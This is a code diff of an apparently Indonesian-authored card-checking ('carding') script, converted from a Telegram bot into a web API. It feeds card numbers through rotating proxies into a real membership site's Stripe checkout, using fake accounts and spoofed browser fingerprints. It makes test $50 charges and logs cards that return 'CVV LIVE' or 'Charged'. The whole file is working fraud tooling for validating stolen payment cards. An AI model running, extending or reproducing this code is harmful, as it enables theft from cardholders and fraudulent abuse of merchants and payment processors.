@@ -1,20 +1,15 @@
+import requests
 import asyncio
-import time
 import random
+import time
 import json
-import logging
-import os
+import pathlib
+from aiohttp import web
+import httpx
 from html import unescape
 from bs4 import BeautifulSoup
-import httpx
-import requests
 
-from telegram import Update
-from telegram.ext import ApplicationBuilder, MessageHandler, filters, CommandHandler, ContextTypes
 
-logging.basicConfig(level=logging.INFO)
-
-# --- Fungsi load proxies ---
 def load_proxies_from_file(filename="proxy.txt"):
     proxies = []
     try:
@@ -27,6 +22,7 @@ def load_proxies_from_file(filename="proxy.txt"):
                 if len(parts) == 4:
                     ip, port, user, password = parts
                     proxy_url = f"http://{user}:{password}@{ip}:{port}"
+                    #print(f"Loaded proxy: {proxy_url}")  # Debug print
                     proxies.append(proxy_url)
                 else:
                     print(f"Proxy format error (harus ip:port:user:pass): {line}")
@@ -34,7 +30,7 @@ def load_proxies_from_file(filename="proxy.txt"):
         print(f"File {filename} tidak ditemukan.")
     return proxies
 
-# --- Fungsi pembantu get substring ---
+
 def gets(s, start, end):
     try:
         start_index = s.index(start) + len(start)
@@ -43,7 +39,7 @@ def gets(s, start, end):
     except ValueError:
         return None
 
-# --- Fungsi mapping error message ---
+
 def extract_relevant_error_message(result: str) -> str:
     lower_result = result.lower()
 
@@ -60,9 +56,12 @@ def extract_relevant_error_message(result: str) -> str:
 
     return result
 
+
 def map_error_message(result: str) -> str:
     lower_result = result.lower()
+
     processed_result = extract_relevant_error_message(result)
+
     if processed_result != result:
         lower_result = processed_result.lower()
 
@@ -75,6 +74,7 @@ def map_error_message(result: str) -> str:
         if 'customer authentication is required' in lower_result:
             return "3D Challenge Required ❎"
 
+    # Handle direct custom error strings like CVV LIVE, CCN LIVE
     if 'cvv live ❎' in lower_result:
         return "CVV LIVE ❎"
     if 'ccn live ❎' in lower_result:
@@ -141,7 +141,7 @@ def map_error_message(result: str) -> str:
 
     return result
 
-# --- Fungsi utama create_payment_method ---
+
 async def create_payment_method(fullz, session, proxy_str):
     proxies = {
         'http': proxy_str,
@@ -150,7 +150,7 @@ async def create_payment_method(fullz, session, proxy_str):
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
-        # Validasi format tanggal
+        # FORMAT dan VALIDASI MASA BERLAKU KARTU
         mes = mes.zfill(2)
         if len(ano) == 4:
             ano = ano[-2:]
@@ -158,8 +158,11 @@ async def create_payment_method(fullz, session, proxy_str):
         current_year = int(time.strftime("%y"))
         current_month = int(time.strftime("%m"))
 
-        expiry_month = int(mes)
-        expiry_year = int(ano)
+        try:
+            expiry_month = int(mes)
+            expiry_year = int(ano)
+        except ValueError:
+            return {"html": "", "paid": False, "error": "Invalid expiry date"}
 
         if expiry_month < 1 or expiry_month > 12:
             return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}
@@ -168,76 +171,98 @@ async def create_payment_method(fullz, session, proxy_str):
         if expiry_year == current_year and expiry_month < current_month:
             return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}
 
-        # Generate random user details
-        rand_id = str(random.randint(9999, 574545))
-        user = "renaseno" + rand_id
-        mail = user + "@gmail.com"
-        pwd = user
+        # ==== Kode utama ====
+        user = "renaseno" + str(random.randint(9999, 574545))
+        mail = "renaseno" + str(random.randint(9999, 574545)) + "@gmail.com"
+        pwd = "renaseno" + str(random.randint(9999, 574545))
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'priority': 'u=0, i',
             'referer': 'https://oncologymedicalphysics.com/membership-account/membership-levels/',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        params = {'level': '10'}
+        params = {
+            'level': '10',
+        }
 
         response = requests.get(
             'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
             params=params,
             headers=headers,
             proxies=proxies,
-            timeout=30
         )
 
         nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
-        pk = gets(response.text, '"publishableKey":"', '",') 
+        pk = gets(response.text, '"publishableKey":"', '",')
         acc = gets(response.text, '"user_id":"', '",')
-
-        if not nonce or not pk or not acc:
-            return {"html": response.text, "paid": False, "error": "Failed to obtain checkout info"}
 
         headers = {
             'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'priority': 'u=1, i',
             'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
         data = {
-            'type': 'card',
+            'type':'card',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
+            'guid':'ddb7184e-48e7-46c2-b95b-cd00a15be7c9ec361d',
+            'muid':'f4d6292e-97f9-41ce-88d0-17cf592455cf2f13ab',
+            'sid':'6840a2e6-878e-431d-b31c-d57ec263241134fb7e',
+            'payment_user_agent':'stripe.js/e49e4dd59e; stripe-js-v3/e49e4dd59e; split-card-element',
+            'referrer':'https://oncologymedicalphysics.com',
+            'time_on_page':'260012',
+            'client_attribution_metadata[client_session_id]':'8410e5d9-2da9-4481-b402-de10b2e475c6',
+            'client_attribution_metadata[merchant_integration_source]':'elements',
+            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
+            'client_attribution_metadata[merchant_integration_version]':'2017',
             'key': pk,
             '_stripe_account': acc,
-            'guid': 'ddb7184e-48e7-46c2-b95b-cd00a15be7c9ec361d',
-            'muid': 'f4d6292e-97f9-41ce-88d0-17cf592455cf2f13ab',
-            'sid': '6840a2e6-878e-431d-b31c-d57ec263241134fb7e',
-            'payment_user_agent': 'stripe.js',
-            'referrer': 'https://oncologymedicalphysics.com',
-            'time_on_page': '260012'
         }
 
         response = requests.post(
             'https://api.stripe.com/v1/payment_methods',
-            data=data,
             headers=headers,
+            data=data,
             proxies=proxies,
-            timeout=30
         )
 
         pm_json = response.json()
         id = pm_json.get('id')
         if not id:
-            err = pm_json.get('error', {}).get('message', '')
-            return {"html": response.text, "paid": False, "error": err or "Failed to create payment method"}
+            return {"html": response.text, "paid": False, "error": "Failed to create payment method"}
 
-        cvc_check = pm_json.get('card', {}).get('checks', {}).get('cvc_check', '').lower()
+        # Deteksi CVV LIVE / CCN LIVE berdasarkan cvc_check
+        cvc_check = pm_json.get('card', {}).get('checks', {}).get('cvc_check', '')
         if not cvc_check:
-            cvc_check = pm_json.get('card', {}).get('cvc_check', '').lower()
+            # fallback cek di card langsung
+            cvc_check = pm_json.get('card', {}).get('cvc_check', '')
+
+        cvc_check = cvc_check.lower()
 
         if cvc_check == 'pass':
             return {"html": response.text, "paid": False, "error": "CVV LIVE ❎"}
@@ -248,24 +273,40 @@ async def create_payment_method(fullz, session, proxy_str):
         last4 = pm_json.get('card', {}).get('last4', '')
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://oncologymedicalphysics.com',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'priority': 'u=0, i',
             'referer': 'https://oncologymedicalphysics.com/membership-account/membership-checkout/?level=10',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        params = {'level': '10'}
+        params = {
+            'level': '10',
+        }
 
         data = {
             'pmpro_level': '10',
             'checkjavascript': '1',
+            'pmpro_other_discount_code': '',
             'username': user,
             'password': pwd,
             'password2': pwd,
             'bemail': mail,
             'bconfirmemail': mail,
+            'fullname': '',
             'CardType': brand,
+            'pmpro_discount_code': '',
             'pmpro_checkout_nonce': nonce,
             '_wp_http_referer': '/membership-account/membership-checkout/?level=10',
             'submit-checkout': '1',
@@ -282,7 +323,6 @@ async def create_payment_method(fullz, session, proxy_str):
             headers=headers,
             data=data,
             proxies=proxies,
-            timeout=30
         )
 
         html_text = response.text
@@ -298,7 +338,7 @@ async def create_payment_method(fullz, session, proxy_str):
     except Exception as e:
         return {"html": "", "paid": False, "error": str(e)}
 
-# --- Fungsi proses mapping response ---
+
 async def charge_resp(result):
     try:
         if isinstance(result, dict):
@@ -323,13 +363,14 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# --- Fungsi pengecekan fullz dan proxy ---
+
 async def multi_checking(fullz, proxies):
     start = time.time()
     if not proxies:
         return "No proxies loaded."
 
     proxy = random.choice(proxies)
+    #print(f"Using proxy: {proxy}")  # Debug output
 
     async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
         result = await create_payment_method(fullz, session, proxy)
@@ -357,57 +398,50 @@ async def multi_checking(fullz, proxies):
         if "❎" not in mapped_error and "🔥" not in mapped_error and "❌" not in mapped_error:
             mapped_error += "❌"
         return f"{fullz} {mapped_error}"
+    #f"{fullz} {mapped_error} {elapsed}s"
+    #f"{fullz} {response} {elapsed}s"
 
     resp = f"{fullz} {response}"
 
-    keywords_to_save = ["Charged 50$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", 
-                        "Your card does not support this type of purchase ❎", "Transaction not allowed ❎",
-                        "3D Challenge Required ❎"]
-
-    if any(keyword in response for keyword in keywords_to_save):
+    if any(keyword in response for keyword in ["Charged 50$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", "Your card does not support this type of purchase ❎", "Transaction not allowed ❎", "3D Challenge Required ❎", "CCN LIVE ❎"]):
         with open("charge.txt", "a", encoding="utf-8") as file:
             file.write(resp + "\n")
 
     return resp
 
-# --- Telegram bot handler ---
 
-proxies = load_proxies_from_file("proxy.txt")
+async def check_card(request):
+    try:
+        data = await request.json()
+    except Exception:
+        return web.json_response({"error": "Invalid JSON body"}, status=400)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        'Bot siap!\nSilahkan kirim data kartu dengan format cc|mes|ano|cvv untuk cek.\nContoh: 4242424242424242|12|25|123'
-    )
+    cc = data.get("cc")
+    if not cc:
+        return web.json_response({"error": "Missing 'cc' field"}, status=400)
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if text.count("|") == 3:
-        await update.message.reply_text("Sedang memeriksa, mohon tunggu...")
-        try:
-            result = await multi_checking(text, proxies)
-            await update.message.reply_text(result)
-        except Exception as e:
-            await update.message.reply_text(f"Terjadi kesalahan: {str(e)}")
-    else:
-        await update.message.reply_text(
-            "Format data tidak valid. Harus cc|mes|ano|cvv\nContoh: 4242424242424242|12|25|123"
-        )
+    proxies = request.app.get("proxies", [])
 
-async def main():
-    token = os.getenv("token")
-    if not token:
-        print("TOKEN environment variable belum diset.")
-        return
+    try:
+        result = await multi_checking(cc, proxies)
+        return web.json_response({"result": result})
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
 
-    app = ApplicationBuilder().token(token).build()
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
+async def index(request):
+    path = pathlib.Path(__file__).parent / "index.html"
+    return web.FileResponse(path)
 
-    print("Bot berjalan...")
-    await app.run_polling()
+
+async def init_app():
+    app = web.Application()
+    app["proxies"] = load_proxies_from_file("proxy.txt")
+    app.router.add_get("/", index)
+    app.router.add_post("/check-card", check_card)
+    return app
+
 
 if __name__ == "__main__":
-    asyncio.run(main())
-
-
+    app = asyncio.run(init_app())
+    web.run_app(app, host="0.0.0.0", port=8080)
